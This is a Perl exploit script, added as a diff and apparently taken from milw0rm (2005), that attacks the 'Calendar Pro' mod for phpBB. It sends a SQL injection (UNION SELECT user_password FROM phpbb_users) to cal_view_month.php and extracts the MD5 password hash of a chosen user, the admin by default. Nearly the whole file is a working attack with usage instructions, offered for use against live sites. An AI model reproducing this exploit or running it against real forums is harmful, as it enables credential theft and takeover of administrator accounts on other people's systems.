@@ -1,0 +1,72 @@
+#!/usr/bin/perl -w
+use IO::Socket;
+
+##    Example:
+##    C:\>cal_phpbb.pl www.site.com /phpBB2/ 2
+##
+##    'Calendar Pro' Mod for phpBB
+##    *************************
+##      [~] Connecting...
+##      [+] Connected!
+##      [~] Sending Data...
+##      [~] Data Sent, Waiting for response...
+##      [+] MD5 Hash for user with id=2 is: 81dc9bdb52d04dc20036dbd8313ed055
+##
+if (@ARGV < 3)
+{
+print "\n\n";
+print "|****************************************************************|\n";
+print " 'Calendar Pro' Mod <= 2.0.33 (Newest version) For phpBB\n";
+print " Bug found by Axl\n";
+print " Coded by CereBrums // 4/4/2005\n";
+print " Usage: cal_phpbb.pl <server> <folder> <user_id>\n";
+print " e.g.: cal_phpbb.pl www.site.com /phpBB2/ 2 \n";
+print " [~] <server> - site address\n";
+print " [~] <folder> - forum folder\n";
+print " [~] <user_id> - user id (2 is default for phpBB admin) \n";
+print "|****************************************************************|\n";
+print "\n\n";
+exit(1);
+}
+
+$take = 0;
+$server = $ARGV[0];
+$folder = $ARGV[1];
+$user_id = $ARGV[2];
+print "\n 'Calendar Pro' Mod for phpBB\n";
+print " *****************************\n";
+print "  [~] Connecting...\n";
+$socket = IO::Socket::INET->new(
+Proto => "tcp",
+PeerAddr => "$server",
+PeerPort => "80") || die "$socket error $!";
+
+print "  [+] Connected!\n";
+print "  [~] Sending Data...\n";
+
+$path = "http://$server/";
+$path .= "/$folder/";
+$path .= "cal_view_month.php?month=04&year=2005&category=-1%20UNION%20SELECT%20user_password%20FROM%20phpbb_users%20where%20user_id=$user_id/*";
+print $socket "GET $path HTTP/1.0\r\n\r\n";
+
+print "  [~] Data Sent, Waiting for response...\n";
+
+while ($answer = <$socket>)
+{
+       if ($take == 1) {
+               $in = rindex ($answer, "(");
+               if ( $in > -1 ) {
+                       $pass = substr($answer,$in+1,32);
+                       print "  [+] MD5 Hash for user with id=$user_id is: $pass\n";
+                       exit();
+               }
+       }
+       if ( rindex ($answer,"cal_view_month.php?month=3&year=2005") > -1 ) {
+               $take = 1;
+       }
+}
+print "  [-] Exploit failed\n";
+
+#### EOF ####
+
+# milw0rm.com [2005-04-04]
